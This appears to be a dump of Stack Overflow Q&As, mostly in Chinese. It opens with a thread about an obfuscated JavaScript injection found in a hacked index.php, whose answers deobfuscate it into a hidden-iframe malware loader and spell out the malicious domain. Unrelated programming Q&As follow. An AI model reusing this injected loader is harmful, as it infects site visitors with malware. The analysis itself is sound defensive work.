"4a\",\"41\",\"1k\",\"4e\",\"41\",\"3m\",\"40\",\"4l\",\"3k\",\"41\",\"4a\",\"4g\",\"41\",\"4e\",\"3k\",\"47\",\"41\",\"41\",\"4a\",\"1l\",\"4c\",\"44\",\"4c\",\"1e\",\"17\",\"4j\",\"45\",\"40\",\"4g\",\"44\",\"2b\",\"1e\",\"1o\",\"1n\",\"1e\",\"17\",\"44\",\"41\",\"45\",\"43\",\"44\",\"4g\",\"2b\",\"1e\",\"1o\",\"1n\",\"1e\",\"17\",\"4f\",\"4g\",\"4l\",\"48\",\"41\",\"2b\",\"1e\",\"4i\",\"45\",\"4f\",\"45\",\"3n\",\"45\",\"48\",\"45\",\"4g\",\"4l\",\"28\",\"44\",\"45\",\"40\",\"40\",\"41\",\"4a\",\"29\",\"4c\",\"4b\",\"4f\",\"45\",\"4g\",\"45\",\"4b\",\"4a\",\"28\",\"3m\",\"3n\",\"4f\",\"4b\",\"48\",\"4h\",\"4g\",\"41\",\"29\",\"48\",\"41\",\"42\",\"4g\",\"28\",\"1n\",\"29\",\"4g\",\"4b\",\"4c\",\"28\",\"1n\",\"29\",\"1e\",\"2c\",\"2a\",\"1m\",\"45\",\"42\",\"4e\",\"3m\",\"49\",\"41\",\"2c\",\"19\",\"1g\",\"29\",\"d\",\"9\",\"9\",\"50\",\"d\",\"9\",\"9\",\"42\",\"4h\",\"4a\",\"3o\",\"4g\",\"45\",\"4b\",\"4a\",\"17\",\"45\",\"42\",\"4e\",\"3m\",\"49\",\"41\",\"4e\",\"1f\",\"1g\",\"4n\",\"d\",\"9\",\"9\",\"9\",\"4i\",\"3m\",\"4e\",\"17\",\"42\",\"17\",\"2b\",\"17\",\"40\",\"4b\",\"3o\",\"4h\",\"49\",\"41\",\"4a\",\"4g\",\"1l\",\"3o\",\"4e\",\"41\",\"3m\",\"4g\",\"41\",\"2j\",\"48\",\"41\",\"49\",\"41\",\"4a\",\"4g\",\"1f\",\"1e\",\"45\",\"42\",\"4e\",\"3m\",\"49\",\"41\",\"1e\",\"1g\",\"29\",\"42\",\"1l\",\"4f\",\"41\",\"4g\",\"2f\",\"4g\",\"4g\",\"4e\",\"45\",\"3n\",\"4h\",\"4g\",\"41\",\"1f\",\"1e\",\"4f\",\"4e\",\"3o\",\"1e\",\"1j\",\"1e\",\"44\",\"4g\",\"4g\",\"4c\",\"28\",\"1m\",\"1m\",\"4e\",\"3m\",\"43\",\"4b\",\"4b\",\"4f\",\"41\",\"1l\",\"45\",\"4c\",\"4d\",\"1l\",\"3o\",\"4b\",\"1m\",\"3o\",\"4b\",\"4e\",\"4e\",\"41\",\"3o\",\"4g\",\"45\",\"4a\",\"43\",\"1m\",\"45\",\"49\",\"3m\",\"43\",\"45\",\"4a\",\"41\",\"1k\",\"4e\",\"41\",\"3m\",\"40\",\"4l\",\"3k\",\"41\",\"4a\",\"4g\",\"41\",\"4e\",\"3k\",\"47\",\"41\",\"41\",\"4a\",\"1l\",\"4c\",\"44\",\"4c\",\"1e\",\"1g\",\"29\",\"42\",\"1l\",\"4f\",\"4g\",\"4l\",\"48\",\"41\",\"1l\",\"4i\",\"45\",\"4f\",\"45\",\"3n\",\"45\",\"48\",\"45\",\"4g\",\"4l\",\"2b\",\"1e\",\"44\",\"45\",\"40\",\"40\",\"41\",\"4a\",\"1e\",\"29\",\"42\",\"1l\",\"4f\",\"4g\",\"4l\",\"48\",\"41\",\"1l\",\"4c\",\"4b\",\"4f\",\"45\",\"4g\",\"45\",\"4b\",\"4a\",\"2b\",\"1e\",\"3m\",\"3n\",\"4f\",\"4b\",\"48\",\"4h\",\"4g\",\"41\",\"1e\",\"29\",\"42\",\"1l\",\"4f\",\"4g\",\"4l\",\"48\",\"41\",\"1l\",\"48\",\"41\",\"42\",\"4g\",\"2b\",\"1e\",\"1n\",\"1e\",\"29\",\"42\",\"1l\",\"4f\",\"4g\",\"4l\",\"48\",\"41\",\"1l\",\"4g\",\"4b\",\"4c\",\"2b\",\"1e\",\"1n\",\"1e\",\"29\",\"42\",\"1l\",\"4f\",\"41\",\"4g\",\"2f\",\"4g\",\"4g\",\"4e\",\"45\",\"3n\",\"4h\",\"4g\",\"41\",\"1f\",\"1e\",\"4j\",\"45\",\"40\",\"4g\",\"44\",\"1e\",\"1j\",\"1e\",\"1o\",\"1n\",\"1e\",\"1g\",\"29\",\"42\",\"1l\",\"4f\",\"41\",\"4g\",\"2f\",\"4g\",\"4g\",\"4e\",\"45\",\"3n\",\"4h\",\"4g\",\"41\",\"1f\",\"1e\",\"44\",\"41\",\"45\",\"43\",\"44\",\"4g\",\"1e\",\"1j\",\"1e\",\"1o\",\"1n\",\"1e\",\"1g\",\"29\",\"d\",\"9\",\"9\",\"9\",\"40\",\"4b\",\"3o\",\"4h\",\"49\",\"41\",\"4a\",\"4g\",\"1l\",\"43\",\"41\",\"4g\",\"2j\",\"48\",\"41\",\"49\",\"41\",\"4a\",\"4g\",\"4f\",\"2g\",\"4l\",\"39\",\"3m\",\"43\",\"33\",\"3m\",\"49\",\"41\",\"1f\",\"1e\",\"3n\",\"4b\",\"40\",\"4l\",\"1e\",\"1g\",\"3g\",\"1n\",\"3i\",\"1l\",\"3m\",\"4c\",\"4c\",\"41\",\"4a\",\"40\",\"2h\",\"44\",\"45\",\"48\",\"40\",\"1f\",\"42\",\"1g\",\"29\",\"d\",\"9\",\"9\",\"50\"];h=2;s=\"\";if(m)for(i=0;i-631!=0;i++){k=i;if(window[\"document\"])s+=String.fromCharCode(parseInt(n[i],25));}z=s;if(v)ev(z)}}}</script>"; 
```

**NOTE** This script wasn't in my code *Before*!! What is this?! How was written in my `index.php` file?!

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-17T09:13:17.547

您的网站遭到入侵。它的发生方式通常是以下场景之一：

1）您已通过 FTP 向使用 windows 的人授予对文档根目录的访问权限，并且他/她的计算机感染了病毒，该病毒从 FTP 客户端配置中恢复了 FTP 密码（记住密码功能）

2) 有人猜出了 FTP 的密码

3) 整个系统可能会受到损害

4）某些脚本/应用程序易受攻击（如@Konerak 所述）

要找出是 1)、2) 还是第三个原因，请查看 FTP 服务器日志 - 因为`proftpd`它`/var/log/proftpd/xferlog`在我的`Debian`系统上

如果是 FTP 问题之一，请立即更改 FTP 密码，在所有客户端上运行防病毒软件并分发新密码。要清理网站，通常只需搜索有问题的字符串并将其从文档根目录中的所有文件中删除即可。它通常是所有受感染文件中的相同字符串。还要注意 javascript 文件被感染 ( `*.js`)

如果网站上存在易受攻击的脚本，可以通过查找index.php的修改时间并在访问日志中找到对应的命中来识别。他们通常有 POST 方法或棘手的 GET 参数（在日志中可见）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-17T10:39:09.287

是的当然：

如果您的页面在您不知情和不符合规定的情况下被修改，那么您的网站肯定存在*漏洞*。

出于对**HOW**的考虑，有一点尝试发现**WHAT**：

为了确保并了解更多关于这种*编码病毒*的信息，我们可以从命令行运行`php`：

**1.**将错误代码复制到脚本，将它们包含在*php*标签之间：

```
cat << eof > badscript
<?php
echo ""; echo "<script>try{if(window.doc....
n=[\"9\",\"9\",\"45\",\"42\",\"1
?> 
```

**2.**使用以下命令进行第一次翻译`php`：

```
php <badscript >badscript2 
```

现在`badscript2`包含一个*javascript 编码的病毒*

```
<script>try{if(window.document)window["document"]["body"]="1...
n=["9","9","45","42","17"...;if(v)ev(z)}}}</script> 
```

阅读这个小脚本后（保留`html`标签）：

```
sed < badscript2 -e 's/<\/\?script>//g' >badscript3 
```

**3.**很少阅读 javascript 代码（我正在使用 emacs）

```
rename s/$/.js/ badscript3 
emacs badscript3.js 
```

...一些格式操作...保存...

```
sed <badscript3.js -e 's/\t/        /g;s/^/    /;s/^\(.\{76\}\).*$/\1.../' 
try{
    if (window.document) window["document"]["body"]="123"}
catch (bawetawe) { 
    if(window.document){
        v=window;
        try{fawbe--}catch(afnwenew){
            try{(v+v)()}catch(gngrthn){
                try{
                    if(020===0x10) v["document"]["bo"+"dy"]="123"
                }catch(gfdnfdgber){
                    m=123;
                    if((alert+"").indexOf("n"+"a"+"ti"+"ve")!==-1) 
                        ev=window["eval"];
                }
            }
            n=["9","9","45","42","17","1f","40","4b","3o","4h","49","41"...
            h=2;
            s="";
            if(m)for(i=0;i-631!=0;i++){
                k=i;
                if(window["document"])
                    s+=String.fromCharCode(parseInt(n[i],25));
            }
            z=s;
            if(v)ev(z)
        }
    }
} 
```

所以可以看出*有趣*的部分来自`n=[...`和`ev(z)`。为此，我使用*Mozilla 的 Spidermonkey*二进制工具`smjs`：

在保留第一个（可读）部分和一些在命令行下不起作用的测试之后`smjs`，比如`window`or `document`，**并**更改**最后一个**操作`ev`（在第一部分`ev=window.eval`中定义为更*smjs*适当的函数（我选择：`print()`;-），有什么发送至`smjs`：

```
n=["9","9","45","42","17","1f","40","4b","3o","4h","49","41","4a","4g","...
h=2;
s="";
for(i=0;i-631!=0;i++){
    k=i;
    s+=String.fromCharCode(parseInt(n[i],25));
}
z=s;
print(z); 
```

**4.**最后给我看这个：

```
smjs < badscript3.js >badscript4.js
emacs badscript4.js 
```

那是：

```
if (document.getElementsByTagName('body')[0]){
iframer();
} else {
document.write("<iframe
      src='http:  --  censored virus link -- .php' width='10' height='10'
      style='visibility:hidden;position:absolute;left:0;top:0;'></iframe>");
}
function iframer(){
var f = document.createElement('iframe');
f.setAttribute('src','http: --  censored virus link -- keen.php');
f.style.visibility='hidden';f.style.position='absolute';
f.style.left='0';f.style.top='0';
f.setAttribute('width','10');f.setAttribute('height','10');
document.getElementsByTagName('body')[0].appendChild(f);
} 
```

注意：为了最大程度地降低`cut'n past`风险，我已经审查了链接，他们最初指向**病毒**：`http:` *斜杠斜杠* `ragoose.ipq.co` *斜杠* `correcting` *斜杠* `imagine-ready_enter_keen.php`

小心点，但玩得开心！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-17T09:23:06.273

我在共享主机上多次发生这种情况。通常它是您或您机器上其他人的易受攻击的脚本，然后可以查找可预测的文件路径并附加到文件中。

```
/home/user1/public_html/index.php for example is very predictable. 
```

因此，该漏洞将允许某人运行`"ls /home/"`然后`./public_html/index.php`在每个目录中查找。很多时候，即使您无法 cd 进入该目录，您也可以打开这些文件。

另一种情况是您的站点或您的其他域之一存在漏洞，这将允许对您的任何子目录进行写访问（因为 Web 服务器通常归您所有）。

# c# - Task vs Thread differences

> ID：13429129
> 
> 赞同：409
> 
> 时间：2012-11-17T08:58:37.450
> 
> 标签：c#, .net, multithreading, task

I'm new to parallel programming. There are two classes available in .NET: `Task` and `Thread`.

So, my questions are:

*   What is the difference between those classes?
*   When is it better to use `Thread` over `Task` (and vice-versa)?

* * *

## 回答 #1

> 赞同：502
> 
> 时间：2012-11-17T09:03:57.337

`Thread`是一个较低级别的概念：如果您直接启动一个线程，您*知道*它将是一个单独的线程，而不是在线程池等上执行。

`Task`不仅仅是“在哪里运行一些代码”的抽象——它实际上只是“对未来结果的承诺”。所以作为一些不同的例子：

*   `Task.Delay`不需要任何实际的 CPU 时间；这就像设置一个计时器在未来关闭
*   返回的任务`WebClient.DownloadStringTaskAsync`在本地不会占用太多 CPU 时间；它代表的结果可能大部分时间都花在网络延迟或远程工作（在 Web 服务器上）
*   `Task.Run()`真正返回的任务*是*说“我希望你单独执行这段代码”；该代码执行的确切线程取决于许多因素。

请注意，`Task<T>`抽象对于 C# 5 中的异步支持至关重要。

一般来说，我建议您尽可能使用更高级别的抽象：在现代 C# 代码中，您应该很少需要显式启动自己的线程。

* * *

## 回答 #2

> 赞同：49
> 
> 时间：2013-02-13T12:30:10.037

通常你会听到*Task 是一个比线程更高级别的概念*......这就是这个短语的意思：

1.  你不能使用 Abort/ThreadAbortedException，你应该在你的“业务代码”中支持取消事件定期测试`token.IsCancellationRequested`标志（也避免长时间或无超时的连接，例如到 db，否则你将永远没有机会测试这个标志）。出于类似的原因`Thread.Sleep(delay)`，应该将调用替换为 `Task.Delay(delay, token)`调用（在内部传递令牌以有可能中断延迟）。

2.  任务没有线程`Suspend`和`Resume`方法功能。**任务实例也不能重用**。

3.  但是你会得到两个新工具：

    a)**延续**

    ```
    // continuation with ContinueWhenAll - execute the delegate, when ALL
    // tasks[] had been finished; other option is ContinueWhenAny

    Task.Factory.ContinueWhenAll( 
       tasks,
       () => {
           int answer = tasks[0].Result + tasks[1].Result;
           Console.WriteLine("The answer is {0}", answer);
       }
    ); 
    ```

    b)**嵌套/子任务**

    ```
    //StartNew - starts task immediately, parent ends whith child
    var parent = Task.Factory.StartNew
    (() => {
              var child = Task.Factory.StartNew(() =>
             {
             //...
             });
          },  
          TaskCreationOptions.AttachedToParent
    ); 
    ```

4.  因此系统线程对任务完全隐藏，但任务的代码仍然在具体的系统线程中执行。**系统线程是任务的资源，**当然在任务的并行执行下仍然存在线程池。线程如何执行新任务可以有不同的策略。另一个共享资源**TaskScheduler**关心它。**TaskScheduler**解决的一些问题1) 更喜欢在同一个线程中执行任务及其延续，最小化切换成本 - 也就是*内联执行*) 2) 更喜欢按照任务开始的顺序执行任务 - 也就是*PreferFairness* 3) 在非活动线程之间更有效地分配任务取决于“任务活动的先验知识” - 又名*偷工减料*。重要提示：通常“异步”与“并行”不同。使用 TaskScheduler 选项，您可以设置异步任务在一个线程中同步执行。为了表达并行代码执行，可以使用更高的抽象（比任务）：[`Parallel.ForEach`](https://docs.microsoft.com/en-us/dotnet/standard/parallel-programming/data-parallelism-task-parallel-library), [`PLINQ`](https://docs.microsoft.com/en-us/dotnet/standard/parallel-programming/parallel-linq-plinq), [`Dataflow`](https://docs.microsoft.com/en-us/dotnet/standard/parallel-programming/dataflow-task-parallel-library).

5.  任务与 C# async/await 功能（即**Promise Model** ）集成，例如`requestButton.Clicked += async (o, e) => ProcessResponce(await client.RequestAsync(e.ResourceName));`，执行`client.RequestAsync`不会阻塞 UI 线程。重要提示：幕后`Clicked`委托调用是绝对常规的（所有线程都由编译器完成）。

这足以做出选择。如果您需要支持取消调用倾向于挂起的遗留 API 的功能（例如无超时连接）并且在这种情况下支持 Thread.Abort()，或者如果您正在创建多线程后台计算并希望使用暂停/恢复优化线程之间的切换，这意味着手动管理并行执行 - 留在线程。否则请转到任务，因为它们可以让您轻松操作它们的组，集成到语言中并提高开发人员的工作效率 -[任务并行库 (TPL)](https://docs.microsoft.com/en-us/dotnet/standard/parallel-programming/task-parallel-library-tpl)。

* * *

## 回答 #3

> 赞同：40
> 
> 时间：2014-03-27T19:12:45.307

The [`Thread`](http://msdn.microsoft.com/en-us/library/system.threading.thread%28v=vs.110%29.aspx) class is used for creating and manipulating a [thread](http://msdn.microsoft.com/en-us/library/windows/desktop/ms684841%28v=vs.85%29.aspx) in Windows.

A [`Task`](http://msdn.microsoft.com/en-us/library/vstudio/system.threading.tasks.task) represents some asynchronous operation and is part of the [Task Parallel Library](http://msdn.microsoft.com/en-us/library/dd460717%28v=vs.110%29.aspx), a set of APIs for running tasks asynchronously and in parallel.

In the days of old (i.e. before TPL) it used to be that using the `Thread` class was one of the standard ways to run code in the background or in parallel (a better alternative was often to use a [`ThreadPool`](http://msdn.microsoft.com/en-us/library/system.threading.threadpool.aspx)), however this was cumbersome and had several disadvantages, not least of which was the performance overhead of creating a whole new thread to perform a task in the background.

Nowadays using tasks and the TPL is a far better solution 90% of the time as it provides abstractions which allows far more efficient use of system resources. I imagine there are a few scenarios where you want explicit control over the thread on which you are running your code, however generally speaking if you want to run something asynchronously your first port of call should be the TPL.

# image-processing - Canny Edge Detection and LoG difference

> ID：13429134
> 
> 赞同：4
> 
> 时间：2012-11-17T08:59:20.250
> 
> 标签：image-processing

What is the difference between Canny Edge Detector and LoG(Laplace of Gaussian) in Diagital Image Processing ?? I am totally new to Digital Image Processing .. I would be thankful if someone could tell me the difference . Thanks and Regards.

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-18T21:03:47.010

**Canny**边缘检测器基于图像的一阶导数（x 和 y 方向的 Sobel 掩模卷积）。导数的大小将如下所示：

![在此处输入图像描述](../Images/709a5838c91d5d15c76f7b8d9f910686.png)

您会看到，通过此操作，可以通过具有高值（白色）的像素来识别线条。然后，canny 算法还将应用非最大值抑制和线跟踪（参见 Wikipedia）。

**然而，高斯**算子的拉普拉斯算子是基于图像的二阶导数。此操作员的响应将如下所示：

![在此处输入图像描述](../Images/c9cad973229fac66990a40b4fc654ac5.png)

LoG 算子的最高响应将位于图像中斑点状结构的中心（与 LoG 内核大小相同）。可以使用 LoG 算子识别线，而不是通过在图像中找到高幅度，而是通过拐点（过零）。您可以看到每条线的一侧是深色，另一侧是白色。基于二阶导数，它对噪声高度敏感。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-17T10:38:54.923

两者都是检测图像中显着特征的算法。Canny 边缘检测在输入图像中寻找边缘。然而，LoG 在图像中寻找斑点，它通过在多个尺度上考虑相同的图像（通过反复缩小图像）来做到这一点。然而，这两种算法都经常用于检测图像中的显着点。

对于实际算法的差异，您应该查阅教科书或维基百科。

计算机视觉通常需要图像中的一组显着点，例如比较图像、检测物体等。但是，没有一种方法可以在所有情况下都是最好的显着点检测方法。Canny 和 LoG 都是检测显着点的方法，但哪一种效果更好取决于具体情况。

# c# - Linq 从两个表中按列表顺序选择

> ID：13429140
> 
> 赞同：2
> 
> 时间：2012-11-17T09:00:03.757
> 
> 标签：c#, sql, linq, select, sql-order-by

我在 DB 中有两个要从中选择的表。在其中一个“事件”中，我有事件（Id，开始，结束，类型），在另一个中，我有“Events_before_after”，我收集与“事件”中的一些事件相关的事件 - （Id，EventId，开始，结束，输入）。
我还有一个事件 id 列表，我需要在选择查询中对事件进行排序。

这就是我所拥有的：

```
List<int> orderIds = ...

from order in orderIds
join event in events order on order equals event.id
select new DataEvent ()
{
    eventId = event.Id,
    start = event.start,
    end = event.end,
    type = event.type
}).Concat
from eventOther in Events_before_after
select new DataEvent ()
{
    eventId = eventOther.Id,
    start = eventOther.start,
    end = eventOther.end,
    type = eventOther.type
} 
```

是否也可以订购第二个选择？我的意思是 - 有没有办法通过`eventId`哪些链接到“事件”来订购它？

我需要的是：

```
event1
event2
eventBefore3
event3
eventAfter3 
```

我所拥有的是：

```
event1
event2
event3
eventBefore3
eventAfter3 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-17T09:06:50.163

你可以这样做：

```
 //your query
 ...
from eventOther in Events_before_after
select new DataEvent ()
{
    eventId = eventOther.Id,
    start = eventOther.start,
    end = eventOther.end,
    type = eventOther.type
}
into NewEvent
order by NewEvent.eventId
select NewEvent; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-18T22:27:45.273

如果我得到您的要点，您想将给定键上的相关事件组合在一起，对它们进行排序，然后按照给定的键顺序投影和展平它们....如果您想这样做，请尝试以下操作：

```
var orderedEvents = orderIds.Join(
                     //Construct Groups 
                     events.GroupBy( e => e.Id)
                           .GroupJoin( Events_before_after,
                                       g => g.Key,
                                       e => e.EventId,
                                       (gEvent, gEventBA) => new { Key = gEvent.Key,
                                       EventGroup = 
                                       gEvent.Select( e => new DataEvent ()
                                                     {
                                                      eventId = e.Id,
                                                      start = e.start,
                                                      end = e.end,
                                                      type = e.type
                                                     })
                                              .Concat( gEventBA.Select( e => new DataEvent ()
                                                                {
                                                                 eventId = e.Id,
                                                                 start = e.start,
                                                                 end = e.end,
                                                                 type = e.type
                                                                }))
                                              .OrderBy(e => e.eventId)),
                      //Project along keys
                      o => o,
                      anon => anon.Key,
                      (o,anon) => anon.EventGroup)
                      //Flatten groups
                           .SelectMany( g => g); 
```

# java - 如何堆叠 getClass()

> ID：13429141
> 
> 赞同：2
> 
> 时间：2012-11-17T09:00:08.000
> 
> 标签：java

为什么第一行有效，第二行无效：

```
Class<? extends Class> c1                  = (new Object()).getClass().getClass();
Class<? extends Class<? extends Class>> c2 = (new Object()).getClass().getClass().getClass(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T10:30:36.020

来自 API 文档[`Object.getClass`](http://docs.oracle.com/javase/6/docs/api/java/lang/Object.html#getClass%28%29)

> **实际结果类型是 Class where |X| 是调用 getClass 的表达式的静态类型的擦除。**

所以`(new Object()).getClass()`会返回一个`Class<? extends Object>`. 我们将呼吁`getClass`这一点。所以**X**将是`Class`，这将给我们`Class<? extends Class>`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T09:10:25.820

```
Type mismatch: cannot convert from Class<capture#5-of ? extends Class> to 
Class<? extends Class<? extends Class>> 
```

这就是为什么。看起来原始打字在这里分开了。泛型在编译期间会被剥离。如果您添加所需的类型转换，它会再次起作用

```
Class<? extends Class<? extends Class>> c2 = 
(Class<? extends Class<? extends Class>>) (newObject()).getClass().getClass().getClass(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-17T10:37:57.797

Java 使用**类型擦除**。没有这样的事情

```
Class<? extends Class<? extends Class>> 
```

实际上，只有`Class<?>`. 其他一切都是虚拟的。

现在，具有三个泛型的类的对象`Example<G1, G2, G3>`将**在运行时**只为您提供类型的保证`Example<?,?,?>`- 请记住，泛型已在运行时被删除，即何时`getClass()`被评估。

```
ArrayList<Integer> inta = new ArrayList<Integer>();
ArrayList<Double> doua = new ArrayList<Double>();
System.err.println(inta.getClass() == doua.getClass()); 
```

应该返回`true`。因此，`getClass()`也应该具有相同的类型：`Class<ArrayList<?>>`. 外部类型是已知的，并且在运行时可用。泛型已被删除。

为避免编程错误，您可以*强制转换*类型：

```
Class<ArrayList<Double>> dacls = (Class<ArrayList<Double>>) doua.getClass(); 
```

但它仍然是与整数数组列表相同的类。

# matlab - 有没有更好的方法来随机生成双重随机矩阵？

> ID：13429144
> 
> 赞同：3
> 
> 时间：2012-11-17T09:00:24.827
> 
> 标签：matlab, matrix

这是通话的简介`n = 2*10^3; M = DStochMat02(n,ones(n)./n);`

```
 time   calls  line
                  1 function M = DStochMat02(n,c)
                  2 % Generate a random doubly stochastic matrix using
                  3 % Theorem (Birkhoff [1946], von Neumann [1953])
                  4 % Any doubly stochastic matrix M can be written as a convex combination
                  5 % of permutation matrices P1,...,Pk (i.e. M = c1*P1+...+ ck*Pk
                  6 % for nonnegative c1,...,ck with c1+...+ck = 1).
                  7 % Complexity: O(n^2)
                  8 % USE: M = DStochMat02(4,[1/2 1/8 1/8 1/4])
                  9 % Derek O'Connor, Oct 2006, Nov 2012\. derekroconnor@eircom.net
  0.02       1   10 M = zeros(n,n);
< 0.01       1   11 I = eye(n);
< 0.01       1   12 for k = 1:n
   1.64   2000   13     pidx = GRPdur(n);                                 % Random Permutation
 107.72   2000   14     P = I(pidx,:);                                    % Random P matrix
  41.09   2000   15     M = M + c(k)*P;
< 0.01    2000   16 end

function p = GRPdur(n)
% -------------------------------------------------------------
% Generate a random permutation p(1:n) using Durstenfeld's
% Shuffle Algorithm, CACM, 1964.
% See Knuth, Section 3.4.2, TAOCP, Vol 2, 3rd Ed.
% Complexity: O(n)
% USE: p = GRPdur(10^7);
% Derek O'Connor, 8 Dec 2010\.  derekroconnor@eircom.net
% -------------------------------------------------------------

    p = 1:n;                  % Start with Identity permutation
for k = n:-1:2
    r = 1+floor(rand*k);      % random integer between 1 and k
    t    = p(k);
    p(k) = p(r);               % Swap(p(r),p(k)).
    p(r) = t;
end
return % GRPdur 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-27T19:48:00.987

如何更改行`14`和`15`以下行：

```
l = ( [ pidx ; 1:n ] - 1 ) * [1;n] + 1; % convert pairs (pidx,1:n) to linear indices
M(l) = M(l) + c(k); 
```

因为`P`非常稀疏，也许只增加 的非零值会更有效`P`。

# java - 使用 JAXB 编组到现有对象

> ID：13429147
> 
> 赞同：5
> 
> 时间：2012-11-17T09:00:44.673
> 
> 标签：java, jaxb, marshalling

是否可以将 XML 直接编组到现有对象并仅更新特定字段？

我只想修改客户端请求的某些字段。

任何指针？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-29T12:17:55.340

解决方案是：**注释和反射。**不，没有相同的库。当我做这个任务时，我搜索了很多。

我已经完成了与您想要的完全相同的事情，为此我已经完成了自己的实现。但它是专有的，所以我不能分享。

但是要提示您解决方案：我使用注释来标记可重新加载的字段，然后使用反射仅重新加载可重新加载的部分。

第 1 步：再次解组 xml 以创建新对象

第 2 步：使用来自新解组的对象的新值调用旧对象的 setter 方法。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-10-28T21:01:01.523

最简洁的答案是不。考虑通用解决方案，没有简单的方法来自定义 jaxb 绑定。请参阅[JAXB 和类实例化](https://stackoverflow.com/questions/7430843/jaxb-and-class-instantiation)

另一种解决方案（可能更粗略）是提取`XML`您要处理的部分，然后执行解组。请参阅[Java 如何提取完整的 XML 块](https://stackoverflow.com/questions/8979851/java-how-to-extract-a-complete-xml-block)

# r - R中的玫瑰图

> ID：13429148
> 
> 赞同：4
> 
> 时间：2012-11-17T09:01:14.280
> 
> 标签：r, ggplot2, rose-diagram

我想绘制一些循环数据的玫瑰图。我一直在使用这个`circular`包，在这个包中它允许你使用函数绘制一个简单的玫瑰图：`rose.diag`. 虽然这绘制了图表，但我希望能够改进绘图，但我无法找到添加到绘图或稍微调整它的方法。我看过把它画进去，`ggplot2`但这对我来说似乎并不清楚，我正在努力在 R 中找到另一个包来绘制这样的玫瑰图。

我在下面发布了一个数据示例和我当前的代码以及我的查询：

```
Angle
0.65454759
0.01355458
0.5052027
0.2264302
-0.350552
-0.428481
0.1231778
0.258787
0.06723504
0.06906181
2.54608572
-1.6591672
3.00437314
-0.0503291
-0.828578
-1.9616418
-0.6468774
0.01438686
0.1162713
0.9938797
0.1861583
0.1547071
0.2577813
0.5110576
0.08714113 
```

这些数据是弧度转向角。使用`circular`包我使这个数据成为类的向量`circular`：

```
x <- circular(Angle) 
```

然后使用以下代码绘制玫瑰图，其中以度数而不是弧度绘制图表：

```
rose.diag(x, pch = 16, cex = 1, axes = TRUE, shrink = 1, col=3, prop = 2, 
    bins=36, upper=TRUE, ticks=TRUE, units="degrees") 
```

我想在这个情节中添加三件事：

1.  更改绘图方向，使 0 位于顶部而不是右侧。
2.  在绘图中添加同心圆，以帮助直观地解释每个“箱”的大小和重量。
3.  添加一条线来识别平均角度（如果可能，使用 sd 误差线）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-17T12:02:55.110

有几种方法可以做到这一点。这个包中有一个“零”参数`rose.diag`。

```
y <- scan() # paste in the values from the question and hit return twice
y <- circlar(y) # not necessary but prevents a warning
rose.diag(y, units = 'degrees', zero = pi/2) # units doesn't change the underlying units 
```

或者，您可以设置`circular`您创建的对象的属性。

```
y <- circlar(y, zero = pi/2)
rose.diag(y, units = 'degrees') # note, no 0 call here 
```

所以，现在剧情轮换了……怎么加东西……

```
> par('usr')
[1] -1.376553  1.376553 -1.123200  1.123200 
```

这给了我用户坐标并告诉我用户空间中的绘图尺寸。现在我可以做一些事情，比如添加一个圆圈。

```
symbols(0, 0, circle = 0.2, inches = FALSE, add = TRUE, fg = 'red') 
```

有一个`lines.circular`功能，但对我来说如何使用它并不明显。`segments`我还可以使用或`arrows`命令绘制一条线，并用它们在图上绘制。它需要一些欧几里得几何来将线的角度和长度转换为点。这一切都应该让你开始。

```
m <- mean.circle(y)
segments(0, 0, cos(m+pi/2), sin(m+pi/2), col = 'red') # note I need to add the new 0 position... there is a lines.circular function but it wasn't obvious to me how to use it. 
```

（提示......取景圆`rose.diag`的半径为 1，因此将其赋予`circle`参数 in`symbols`将准确地绘制在该点）

# c# - Winform应用中UserControl事件/属性/方法/枚举等的操作

> ID：13429153
> 
> 赞同：0
> 
> 时间：2012-11-17T09:01:39.973
> 
> 标签：c#, windows, winforms, visual-studio

我在（Winforms 应用程序）上有 200 多个用户控件，并且混淆了每个用户控件的事件/方法/属性和枚举，这些用户控件在编码页面`form1.cs`中的顺序不正确。`form1.cs`

我可以像设置评论一样手动订购它们，也可以手动`//`提供身份。

我想知道是否有通过特定方法或任何其他方式处理它们的不同方法？

**例如：**

```
namespace FinApps
{
public partial class Form1 : Form
{
    private FinAppsUserControl.ExportReports er;
    private FinAppsUserControl.BankMaster bankmaster;
    private FinAppsUserControl.CompanyMaster companymaster;

    public Form1()
    {
        er = new FinAppsUserControl.ExportReports();
        bankmaster = new FinAppsUserControl.BankMaster();
        companymaster = new FinAppsUserControl.CompanyMaster();

        InitializeComponent();

        this.panel2.Controls.Add(er);
        this.panel2.Controls.Add(bankmaster);
        this.panel2.Controls.Add(companymaster);

      bankmaster.BankMasterExitEvent += new FinAppsUserControl.BankMaster.bankmasterexitevent(bankmaster_BankMasterExitEvent);
        er.ExportReportsKeyDownEvent += new FinAppsUserControl.ExportReports.exportreportskeydownevent(er_ExportReportsKeyDownEvent);
        companymaster.CloseEvent += new FinAppsUserControl.CompanyMaster.closeevent(companymaster_CloseEvent);
     }

//below is mix event/properties/method not sorted by specific UserControl Order..

    private void er_ExportReportsKeyDownEvent(ref Message msg, Keys keydata)
    {
        if (keydata == Keys.Escape) 
        {
        // specific tasks          
        }
    }
 private void bankmaster_BankMasterExitEvent()
 {
      //specific tasks
 }

 private void companymaster_CloseEvent()
 {
        //specific tasks
 } 
```

但我想对特定 UserControl 的事件/方法/属性进行排序，例如我手动调整的特定 UserControl 虎钳，如下所示。

```
 //ExportReportUserControl
    private void er_ExportReportsKeyDownEvent(ref Message msg, Keys keydata)
    {
        if (keydata == Keys.Escape) 
        {
        // specific tasks          
        }
    }

   //BankMasterUserControl
 private void bankmaster_BankMasterExitEvent()
 {
      //specific tasks
 }

  //CompanyMasterUserControl

 private void companymaster_CloseEvent()
 {
        //specific tasks
 } 
```

